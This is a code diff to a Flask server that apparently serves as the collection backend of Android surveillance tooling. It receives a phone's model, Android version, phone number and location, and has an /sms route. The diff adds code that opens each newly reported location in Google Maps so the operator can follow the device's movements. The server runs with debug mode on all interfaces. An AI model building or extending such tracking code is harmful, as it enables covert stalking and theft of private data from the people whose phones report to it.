@@ -1,8 +1,11 @@
 from flask import Flask, request, jsonify, render_template
 import json
 import os
+import sys
+import webbrowser
 app = Flask(__name__)
 
+visited_location = set()
 
 @app.route("/device", methods=["POST"])
 def device():
@@ -16,8 +19,17 @@ def device():
      print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android version is " +  verison +  " and phone number is " + phoneno)
     except:
      location = device_info['location']
+     maps = device_info['maps']
      print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android version is " +  verison)
      print("Location is " + location)
+     print("Open in google maps: " + maps)
+     # ensure google maps is only open once if there is no change in location
+     if maps in visited_location:
+      print("There is no updates for location.")
+     else:
+      visited_location.add(maps)
+      webbrowser.open(maps, new=1)
+
 
 
     return "deviceinfo working", 200
@@ -38,5 +50,6 @@ def sms():
 
 if __name__ == "__main__":
     app.run('0.0.0.0', debug=True)
+
 
     
